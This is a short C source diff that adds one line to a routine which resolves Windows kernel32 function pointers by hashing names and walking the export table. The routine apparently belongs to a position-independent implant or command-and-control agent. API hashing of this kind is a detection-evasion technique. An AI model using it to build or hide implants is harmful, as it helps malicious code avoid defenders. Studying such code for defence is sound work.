@@ -87,6 +87,7 @@ SECTION_CODE VOID hannibal_resolve_pointers()
     hannibal_instance_ptr->Win32.HeapAlloc = hannibal_instance_ptr->Win32.GetProcAddress(hannibal_instance_ptr->Modules.Kernel32, "HeapAlloc");
     hannibal_instance_ptr->Win32.HeapFree = hannibal_instance_ptr->Win32.GetProcAddress(hannibal_instance_ptr->Modules.Kernel32, "HeapFree");
     hannibal_instance_ptr->Win32.GetProcessHeap = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("GetProcessHeap"));
+    hannibal_instance_ptr->Win32.GetModuleHandleA = get_func_ptr_from_module_eat(hannibal_instance_ptr->Modules.Kernel32, HASH_STR("GetModuleHandleA"));
 
 #endif // KERNEL32
 
